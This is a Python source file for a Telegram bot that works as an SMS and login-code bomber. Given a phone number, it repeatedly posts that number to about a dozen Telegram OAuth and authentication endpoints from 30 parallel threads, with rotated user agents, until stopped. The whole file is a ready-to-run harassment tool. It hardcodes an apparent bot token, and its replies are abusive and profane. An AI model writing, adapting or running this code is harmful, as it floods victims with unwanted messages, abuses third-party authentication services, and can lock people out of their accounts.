import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import threading
import re
from concurrent.futures import ThreadPoolExecutor

bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
]

endpoints = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password'
]

active = {}
awaiting = set()

def is_phone(s):
    return bool(re.match(r'^\+?\d{7,15}$', s.strip()))

def send_req(phone, url, headers):
    try:
        requests.post(url, data={'phone': phone}, headers=headers, timeout=2)
    except:
        pass

def spam_worker(chat_id, phone, stop):
    executor = ThreadPoolExecutor(max_workers=30)
    while not stop.is_set():
        headers = {'User-Agent': USER_AGENTS[hash(phone + str(threading.get_ident())) % len(USER_AGENTS)]}
        futures = [executor.submit(send_req, phone, url, headers) for url in endpoints]
        for f in futures:
            if stop.is_set():
                executor.shutdown(wait=False)
                break
    active.pop(chat_id, None)
    bot.send_message(chat_id, "spam zakanchivaetsya pizdec")

@bot.message_handler(commands=['start'])
def start(m):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("spam", callback_data="spam"))
    bot.send_message(m.chat.id, "zdarova pidr gotov spamat?", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "spam")
def callback_spam(call):
    bot.answer_callback_query(call.id)
    cid = call.message.chat.id
    if cid in active:
        bot.send_message(cid, "spam uje rabotaet ebalo zakroy i /stop")
        return
    awaiting.add(cid)
    bot.send_message(cid, "napishi nomer bystro hui")

@bot.message_handler(func=lambda m: m.chat.id in awaiting and is_phone(m.text))
def start_spam(m):
    cid = m.chat.id
    awaiting.discard(cid)
    if cid in active:
        return
    phone = m.text.strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    bot.reply_to(m, "drochka poehala chtoby zakanchivat /stop")
    stop = threading.Event()
    active[cid] = stop
    threading.Thread(target=spam_worker, args=(cid, phone, stop), daemon=True).start()

@bot.message_handler(commands=['stop'])
def stop_cmd(m):
    cid = m.chat.id
    if cid in active:
        active[cid].set()
        bot.reply_to(m, "ostanavlivaem suka")
    else:
        bot.reply_to(m, "net spama debil")

@bot.message_handler(func=lambda m: True)
def fallback(m):
    cid = m.chat.id
    if cid in awaiting:
        awaiting.discard(cid)
        bot.reply_to(m, "nomer ne verniy ebat tupoy")
    else:
        bot.reply_to(m, "chego nado /start ili /stop")

if __name__ == '__main__':
    bot.infinity_polling()
